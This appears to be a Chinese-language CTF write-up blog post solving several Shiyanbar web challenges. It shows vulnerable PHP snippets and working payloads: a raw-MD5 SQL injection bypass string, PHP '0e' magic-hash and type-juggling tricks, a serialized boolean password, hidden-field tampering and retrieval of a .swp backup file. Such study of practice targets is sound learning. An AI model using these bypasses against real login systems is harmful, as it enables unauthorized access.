---
title: '实验吧web'
date: 2019-08-06
updated: 2019-08-20
category: 'ctf'
tags:
  - 'web'
  - 'wp'
  - '实验吧'
lang: 'zh'
draft: false
---
记录一下实验吧的wp

## 后台登陆

ctrl+u查看源码

```php
<!-- $password=$_POST['password'];
	$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
	$result=mysqli_query($link,$sql);
		if(mysqli_num_rows($result)>0){
			echo 'flag is :'.$flag;
		}
		else{
			echo '密码错误!';
		} -->
```

一上来就问管理员密码，并且要求登陆，那么是爆破呢，还是爆破呢？

emmmmm其实这题的考点是md5的

查了一下官方文档，md5函数的第二个参数如果为true,那么就会返回原始16字符二进制格式

而且sql语句显然是可以拼接注入的，关键在于如何注入了

提供一个字符串： ffifdyop  
md5后，276f722736c95d99e921722cf9ed621c再转成字符串:’ ‘ ‘or’ 6解析:存在 or 即代码的两边有一边为真既可以绕过，后面的其实为垃圾代码没有任何用的。or 后面有6，非零值即为真。既可以成功绕过。

> [http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php](http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php)

当然看评论也有说密码就是e58的  
[参考](https://www.jianshu.com/p/)

## 认真一点

> [http://ctf5.shiyanbar.com/web/earnest/index.php](http://ctf5.shiyanbar.com/web/earnest/index.php)

这道题是盲注的题目，不太好搞

## 天下武功唯快不破

这个可以通过浏览器抓包，然后发现响应头中有一个FLAG字段显然是base64加密过的，解密之后就会得到提示，让你写脚本post提交

我写的垃圾代码如下：

```python
import urllib
import base64
import requests
res = urllib.urlopen("http://ctf5.shiyanbar.com/web/10/10.php")

head = str(res.headers)

FLAG = head[head.index('FLAG')+6:head.index('FLAG')+48+6]

flagBase64 = base64.decodestring(FLAG)

TrueFlag = flagBase64[flagBase64.index(':')+1:]

data = {'key': TrueFlag}
res = requests.post(url='http://ctf5.shiyanbar.com/web/10/10.php', data=data)

print res.content
```

师傅写的代码比我好看多了

```python
# coding:utf8
import requests
import base64
url = "http://ctf4.shiyanbar.com/web/10.php" # 目标URL
s = requests.Session() # 获取 Session
response = s.get(url) # 打开链接
head = response.headers # 获取响应头
flag = base64.b64decode(head['flag']).split(':')[1] # 获取相应头中的Flag
print flag # 打印Flag
postData = {'key': flag} # 构造Post请求体
result = s.post(url=url, data=postData) # 利用Post方式发送请求
# (注意要在同一个Session中 , 有的时候还需要设置Cookies , 但是此题不需要)
print result.text # 打印响应内容
```

## 拐弯抹角

这个涉及到我的知识盲区，叫做伪静态页面  
[百度百科](https://baike.baidu.com/item/%E4%BC%AA%E9%9D%99%E6%80%81)

payload 如下：

> [http://ctf5.shiyanbar.com/indirection/index.php/a/index.php](http://ctf5.shiyanbar.com/indirection/index.php/a/index.php)

## Forms

> 作为网络安全的人才，一定要仔细观察每一处地方

比如这个题目的表单：

```html
<form action="" method="post">
    PIN:<br>
    <input type="password" name="PIN" value="">
    <input type="hidden" name="showsource" value=0>
    <button type="submit">Enter</button>
```

很明显看到，有一个`hidden`字段，而且是`showsource`,如果将其修改为1就能得到源码

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba6.png)

源码如下：  

```php
<?php
$a = $_POST["PIN"];
if ($a == -19827747736161128312837161661727773716166727272616149001823847) {
    echo "Congratulations! The flag is $flag";
} else {
    echo "User with provided PIN not found.";
}
?>
```

emmmm后面就不说了

## 天网管理系统

查看源码有隐藏字段

```html
<!-- $test=$_GET['username']; $test=md5($test); if($test=='0') -->
```

联想到php代码审计的小trick

md5(QNKCDZO)得到的结果是0e开头的

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba7.png)

得到提示，

访问`http://ctf5.shiyanbar.com/10/web1/user.php?fame=hjkleffifer`

得到：  

```
$unserialize_str = $_POST['password']; $data_unserialize = unserialize($unserialize_str); if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???') { print_r($flag); } 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年
```

天真的我以为那三个问号就是真的问号

唉。。

```php
<?php

$a = array('user'=>true, 'pass'=>true);
$b = serialize($a);

$c = unserialize($b);
var_dump($b);
?>
```

将这个作为password输入`a:2:{s:4:"user";b:1;s:4:"pass";b:1;}`

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba8.png)

## 忘记密码

这个题目有点难度

不过还是要获取信息

查看源代码发现两处关键信息：

```html
<meta name="admin" content="admin@simplexue.com" />
<meta name="editor" content="Vim" />
```

告诉了你管理员的邮箱和vim。。告诉我vim干嘛？当然是swp文件了

此处访问`http://ctf5.shiyanbar.com/10/upload/.submit.php.swp`可以得到swp文件  
(这是通过抓包知道发现表单上传的就是这个文件，多试几次，记得在文件名前加*.*)

```php

........这一行是省略的代码........

/*
如果登录邮箱地址不是管理员则 die()
数据库结构

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `token` int(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
(1, '****不可见***', '***不可见***', 0);
*/

........这一行是省略的代码........

if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```

token是0e00000000即可绕过

payload如下：

> [http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&token=0e00000000](http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&token=0e00000000)
